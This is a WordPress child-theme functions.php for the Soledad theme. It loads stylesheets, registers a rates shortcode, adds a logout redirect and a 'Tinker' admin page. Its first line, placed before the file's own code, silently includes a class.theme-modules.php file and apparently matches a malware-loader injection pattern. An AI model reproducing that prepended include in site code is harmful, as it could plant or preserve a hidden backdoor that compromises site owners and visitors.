<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/*
 Soledad child theme functions and definitions
*/
function penci_soledad_child_scripts() {
    wp_enqueue_style( 'penci-soledad-parent-style', get_template_directory_uri(). '/style.css' );
	if ( is_rtl() ) {
		wp_enqueue_style( 'penci-soledad-rtl-style', get_template_directory_uri(). '/rtl.css' );
	}
}
add_action( 'wp_enqueue_scripts', 'penci_soledad_child_scripts' );

/*
 * All custom functions go here
 */

//using rates widget as a shortcode
function wpb_rates_shortcode() {
    require_once "rates.php";
}
// register shortcode
add_shortcode('rates', 'wpb_rates_shortcode');

//redirect to homepage after loging out
add_action('wp_logout','ps_redirect_after_logout');
function ps_redirect_after_logout(){
    wp_redirect( '/' );
    exit();
}

function wpdocs_tinker_menu_page() {
    add_menu_page(
        'Tinker',
        'Tinker',
        'manage_options',
        'tinker',
        'custom_menu_callback'
    );
    function custom_menu_callback(){
        require_once 'tinker_options.php';
    }

}
add_action( 'admin_menu', 'wpdocs_tinker_menu_page' );

//tinker
require_once "tinker.php";
